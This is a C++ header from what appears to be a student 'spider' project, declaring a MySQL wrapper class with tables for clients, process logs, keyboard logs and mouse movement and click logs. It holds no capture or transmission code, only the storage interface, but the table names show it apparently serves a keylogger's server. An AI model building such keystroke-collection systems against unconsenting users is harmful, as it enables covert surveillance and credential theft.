/*
** DataBase.h for  in /home/ouroub_a/rendu/spider-2017-krier_g/Server/DB
**
** Made by amina ourouba
** Login   <ouroub_a@epitech.net>
**
** Started on  Sat Nov  1 22:39:34 2014 amina ourouba
** Last update Sun Nov  9 18:22:30 2014 amina ourouba
*/

#pragma once

#include <map>
#include <string>
#include <mysql/mysql.h>

const std::string CLIENT_T =  std::string("client");
const std::string PROCESS_T =  std::string("process_logs");
const std::string KB_T =  std::string("kb_logs");
const std::string MOUSEM_T =  std::string("mouse_move_logs");
const std::string MOUSEC_T =  std::string("mouse_click_logs");

class DataBase
{
private:
  MYSQL		_mysql;
  MYSQL_RES	*_result;
  MYSQL_FIELD	*_field;
  MYSQL_ROW	_row;
  int		query(std::string &q);

public:
  DataBase(std::string &passwd);
  void insertInTable(const std::string &table, std::map<std::string, std::string> &data);
  std::map<std::string, std::string>      selectInTable(const std::string &table, std::string data, std::string where = "");
  ~DataBase();
};
